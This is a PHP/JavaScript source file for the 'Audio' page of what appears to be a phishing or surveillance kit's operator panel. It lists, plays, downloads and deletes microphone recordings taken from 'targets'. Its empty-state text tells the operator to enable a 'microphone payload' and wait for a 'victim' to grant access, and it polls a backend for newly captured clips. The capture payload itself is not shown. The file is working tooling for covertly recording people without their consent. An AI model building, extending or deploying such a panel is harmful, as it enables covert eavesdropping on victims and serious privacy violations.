<?php
/**
 * route-audio.php — UI for the "Audio" sidebar route.
 *
 * Lists every microphone clip across every target, using the design
 * system's .audio-list / .audio-row / .audio-waveform pattern. The
 * waveform is the design-system stub at first paint; once the operator
 * hits play we sample the real audio buffer and re-render the bars to
 * match — so the visual progress reflects actual playback position.
 *
 * Caller (panel.php) is responsible for auth.
 */
?>
<section class="audio-section">

  <div class="audio-toolbar">
    <div class="audio-stats">
      <span class="badge badge-cyan" id="aud-stat-total"><span class="badge-dot cyan pulse"></span>0 CLIPS</span>
      <span class="badge badge-green" id="aud-stat-new" hidden>0 NEW</span>
      <span class="badge badge-muted" id="aud-stat-size">0 KB</span>
    </div>
    <div class="audio-actions-bar">
      <button type="button" class="btn btn-sm btn-outline" id="aud-refresh">
        <svg class="icon icon-sm"><use href="#i-refresh"/></svg> Refresh
      </button>
    </div>
  </div>

  <div class="audio-list" id="audio-list"></div>

  <div class="audio-empty" id="audio-empty" hidden>
    <svg class="icon icon-xl"><use href="#i-mic"/></svg>
    <div class="audio-empty-title">No audio clips yet</div>
    <div class="audio-empty-sub">// enable the <code>microphone</code> payload on a target and wait for a victim to grant access</div>
  </div>

</section>

<!-- Hidden <audio> element drives playback for whichever row is active. -->
<audio id="audio-player" preload="none" style="display:none"></audio>

<!-- Row template. -->
<template id="audio-row-tpl">
  <div class="audio-row">
    <button type="button" class="audio-play" title="Play / pause">
      <svg class="icon icon-md"><use href="#i-play"/></svg>
    </button>
    <div class="audio-info">
      <div class="audio-meta">
        <span class="ip a-target"></span>
        <span class="time a-time"></span>
        <span class="size a-size"></span>
        <span class="badge badge-green a-new" style="font-size:9px" hidden>NEW</span>
      </div>
      <div class="audio-waveform" data-waveform="48"></div>
    </div>
    <span class="audio-duration a-duration">--:--</span>
    <div class="audio-actions">
      <a class="audio-action a-download" title="Download" download>
        <svg class="icon icon-sm"><use href="#i-download"/></svg>
      </a>
      <button type="button" class="audio-action danger a-delete" title="Delete">
        <svg class="icon icon-sm"><use href="#i-trash"/></svg>
      </button>
    </div>
  </div>
</template>

<script>
/* ── Audio route ─────────────────────────────────────────────── */
(function () {
  const API           = 'api/audio.php';
  const AUDIO_POLL_MS = 5000;
  const NEW_WINDOW_SEC = 5 * 60;
  const WAVE_BARS      = 48;

  const $list  = document.getElementById('audio-list');
  const $empty = document.getElementById('audio-empty');
  const $tpl   = document.getElementById('audio-row-tpl');
  const $bTotal = document.getElementById('aud-stat-total');
  const $bNew   = document.getElementById('aud-stat-new');
  const $bSize  = document.getElementById('aud-stat-size');
  const $btnRefresh = document.getElementById('aud-refresh');
  const $player = document.getElementById('audio-player');

  let activeRow = null;   // currently-playing row (DOM)

  function fmtBytes(n) {
    if (!n) return '0 KB';
    if (n < 1024)        return n + ' B';
    if (n < 1024*1024)   return (n / 1024).toFixed(1) + ' KB';
    return (n / 1024 / 1024).toFixed(1) + ' MB';
  }
  function relTime(unix) {
    const diff = Math.max(0, Math.floor(Date.now()/1000) - unix);
    if (diff < 60)    return diff + 's ago';
    if (diff < 3600)  return Math.floor(diff/60) + 'm ago';
    if (diff < 86400) return Math.floor(diff/3600) + 'h ago';
    return Math.floor(diff/86400) + 'd ago';
  }
  function fmtDuration(sec) {
    if (!isFinite(sec)) return '--:--';
    const m = Math.floor(sec / 60);
    const s = Math.floor(sec % 60);
    return String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
  }

  /* Pseudo-random but stable bar heights, seeded by the row's slug+ts so
     the same clip always renders the same waveform until play replaces it.
     We emit pixel heights (not %) because the design system gives the
     waveform `flex: 1` on a parent without a definite height, which
     prevents % heights on the bars from resolving in some browsers. */
  function buildPlaceholderBars(seed) {
    const out = [];
    for (let i = 0; i < WAVE_BARS; i++) {
      const v = Math.abs(Math.sin((i + seed) * 0.6) * Math.cos((i + seed) * 0.31)) * 0.85 + 0.15;
      out.push((v * 22 + 4).toFixed(0));   // 4–26px
    }
    return out;
  }
  function paintBars(waveEl, heightsPx) {
    waveEl.innerHTML = heightsPx.map(h => `<div class="audio-bar" style="height:${h}px"></div>`).join('');
  }

  let lastCount = 0;
  function render(payload) {
    const items = payload.items || [];
    const newCount = items.filter(it => (Date.now()/1000 - it.ts) <= NEW_WINDOW_SEC).length;

    $bTotal.innerHTML = '<span class="badge-dot cyan pulse"></span>' + items.length + ' CLIPS';
    $bSize.textContent = fmtBytes(payload.total_size || 0) + ' TOTAL';
    if (newCount > 0) { $bNew.hidden = false; $bNew.textContent = newCount + ' NEW'; }
    else              { $bNew.hidden = true; }

    if (items.length === 0) {
      $list.innerHTML = '';
      $empty.hidden = false;
      lastCount = 0;
      return;
    }
    $empty.hidden = true;

    // Diff guard.
    const sig = items.length + ':' + (items[0]?.ts || 0);
    if ($list.dataset.sig === sig) return;
    $list.dataset.sig = sig;

    // Stop any current playback so we don't leave a stale row "playing".
    stopActiveRow();

    $list.innerHTML = '';
    items.forEach(it => {
      const node = $tpl.content.firstElementChild.cloneNode(true);
      const wave = node.querySelector('.audio-waveform');

      node.dataset.url    = it.url;
      node.dataset.target = it.target;
      node.dataset.file   = it.file;
      node.querySelector('.a-target').textContent = '/' + it.target;
      node.querySelector('.a-time').textContent   = relTime(it.ts);
      node.querySelector('.a-size').textContent   = fmtBytes(it.size);
      node.querySelector('.a-new').hidden = (Date.now()/1000 - it.ts) > NEW_WINDOW_SEC;

      const baseName = it.file.replace(/\.webm$/, '');
      const dl = node.querySelector('.a-download');
      dl.href = it.url;
      dl.setAttribute('download', it.target + '_' + baseName + '.webm');

      // Seed the waveform from a stable hash of the URL.
      let seed = 7;
      for (const c of it.url) seed = (seed * 31 + c.charCodeAt(0)) >>> 0;
      paintBars(wave, buildPlaceholderBars(seed));

      node.querySelector('.audio-play').addEventListener('click', () => togglePlay(node));
      node.querySelector('.a-delete')   .addEventListener('click', () => deleteClip(it, node));

      $list.appendChild(node);
    });

    if (lastCount && items.length > lastCount && typeof fireToast === 'function') {
      fireToast('success', 'NEW AUDIO', (items.length - lastCount) + ' new mic clip(s) captured');
    }
    lastCount = items.length;
  }

  /* ── Playback ─────────────────────────────────────── */
  function stopActiveRow() {
    if (!activeRow) return;
    activeRow.classList.remove('playing');
    const ic = activeRow.querySelector('.audio-play svg use');
    if (ic) ic.setAttribute('href', '#i-play');
    activeRow.querySelectorAll('.audio-bar').forEach(b => b.classList.remove('played','current'));
    activeRow = null;
  }

  function togglePlay(row) {
    if (activeRow === row) {
      // Clicking the same row toggles pause/resume.
      if ($player.paused) $player.play();
      else                $player.pause();
      return;
    }
    stopActiveRow();
    activeRow = row;
    row.classList.add('playing');
    const ic = row.querySelector('.audio-play svg use');
    if (ic) ic.setAttribute('href', '#i-pause');

    $player.src = row.dataset.url;
    $player.play().catch(() => stopActiveRow());
  }

  $player.addEventListener('loadedmetadata', () => {
    if (!activeRow) return;
    activeRow.querySelector('.a-duration').textContent = fmtDuration($player.duration);
  });
  $player.addEventListener('timeupdate', () => {
    if (!activeRow || !$player.duration) return;
    const bars = activeRow.querySelectorAll('.audio-bar');
    const idx  = Math.floor(($player.currentTime / $player.duration) * bars.length);
    bars.forEach((b, i) => {
      b.classList.toggle('played',  i < idx);
      b.classList.toggle('current', i === idx);
    });
  });
  $player.addEventListener('ended', () => {
    if (!activeRow) return;
    activeRow.querySelector('.audio-play svg use').setAttribute('href', '#i-play');
    activeRow.querySelectorAll('.audio-bar').forEach(b => b.classList.remove('played','current'));
    activeRow.classList.remove('playing');
    activeRow = null;
  });
  $player.addEventListener('pause', () => {
    if (!activeRow) return;
    const ic = activeRow.querySelector('.audio-play svg use');
    if (ic) ic.setAttribute('href', '#i-play');
  });
  $player.addEventListener('play', () => {
    if (!activeRow) return;
    const ic = activeRow.querySelector('.audio-play svg use');
    if (ic) ic.setAttribute('href', '#i-pause');
  });

  /* ── Delete ──────────────────────────────────────── */
  async function deleteClip(it, node) {
    if (!confirm('Delete this audio clip? This cannot be undone.')) return;
    if (activeRow === node) {
      $player.pause();
      stopActiveRow();
    }
    try {
      const fd = new FormData();
      fd.append('action', 'delete');
      fd.append('slug', it.target);
      fd.append('file', it.file);
      const res  = await fetch(API, { method: 'POST', body: fd, credentials: 'same-origin' });
      const json = await res.json();
      if (!res.ok || !json.ok) throw new Error(json.error || 'delete failed');
      if (typeof fireToast === 'function') fireToast('success', 'CLIP DELETED', it.file);
      load(false);
    } catch (e) {
      if (typeof fireToast === 'function') fireToast('error', 'DELETE FAILED', e.message);
    }
  }

  /* ── Fetch + poll ────────────────────────────────── */
  async function load(showError) {
    try {
      const res  = await fetch(API, { credentials: 'same-origin', cache: 'no-store' });
      const json = await res.json();
      if (!res.ok || !json.ok) throw new Error(json.error || 'request failed');
      render(json);
    } catch (e) {
      if (showError && typeof fireToast === 'function') fireToast('error', 'LOAD FAILED', e.message);
    }
  }
  $btnRefresh.addEventListener('click', () => load(true));

  let pollTimer = null;
  function startPoll() { stopPoll(); pollTimer = setInterval(() => load(false), AUDIO_POLL_MS); }
  function stopPoll()  { if (pollTimer) { clearInterval(pollTimer); pollTimer = null; } }
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) stopPoll();
    else { load(false); startPoll(); }
  });

  load(false).then(startPoll);
})();
</script>

<style>
.audio-section { display: flex; flex-direction: column; gap: var(--space-4); }
.audio-toolbar {
  display: flex; align-items: center; justify-content: space-between;
  flex-wrap: wrap; gap: var(--space-3);
}
.audio-stats        { display: flex; gap: var(--space-2); flex-wrap: wrap; }
.audio-actions-bar  { display: flex; gap: var(--space-2); }

/* The design system gives .audio-waveform `flex:1` which collapses its
   height to 0 inside a column-flex parent that has no fixed height. Pin
   the height back so the bars actually render at the intended 26px. */
.audio-row .audio-waveform { min-height: 26px; }

.audio-empty[hidden] { display: none !important; }
.audio-empty {
  display: flex; flex-direction: column; align-items: center; justify-content: center;
  text-align: center;
  padding: var(--space-7) var(--space-4);
  background: var(--bg-surface);
  border: 1px dashed var(--border-subtle);
  border-radius: var(--radius-lg);
  color: var(--text-muted);
  gap: var(--space-2);
}
.audio-empty .icon { color: var(--text-muted); width: 36px; height: 36px; }
.audio-empty-title {
  font-family: var(--font-mono); font-size: var(--text-sm); font-weight: 600;
  color: var(--text-secondary); letter-spacing: .04em;
}
.audio-empty-sub  { font-family: var(--font-mono); font-size: var(--text-xs); }
.audio-empty-sub code {
  background: var(--bg-overlay);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-sm);
  padding: 1px 5px;
  color: var(--text-code);
}
</style>
